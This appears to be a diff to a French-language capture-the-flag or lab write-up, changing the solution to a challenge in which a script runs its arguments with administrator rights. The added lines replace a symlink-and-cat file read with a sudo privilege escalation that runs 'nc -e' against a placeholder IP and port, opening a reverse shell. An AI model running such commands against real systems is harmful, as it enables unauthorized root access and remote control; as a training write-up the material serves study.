@@ -160,10 +160,10 @@ Un script exécute tout ce qu'on lui passe en paramètre avec des droits d'admin
 
 #### Solution
 
-Une solution parmis plusieurs.
+Une solution parmis plusieurs?
 
 ```bash
-ln -s ../secretuser/secret z &&
-    sudo -u secretuser \
-        /elevate.sh cat z '1>&0'
+ln -s /bin/bash z || true &&
+    sudo -u superuser \
+        /elevate.sh nc -e z <IP> <PORT>
 ```
